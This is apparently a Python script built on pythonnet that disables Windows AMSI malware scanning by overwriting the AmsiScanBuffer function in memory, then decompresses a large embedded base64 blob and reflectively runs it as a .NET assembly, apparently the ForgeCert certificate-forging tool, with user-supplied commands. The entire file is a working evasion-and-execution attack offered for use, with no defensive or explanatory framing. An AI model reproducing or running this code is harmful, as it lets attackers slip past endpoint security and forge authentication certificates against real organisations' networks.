import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("ForgeCert.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str](command)
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()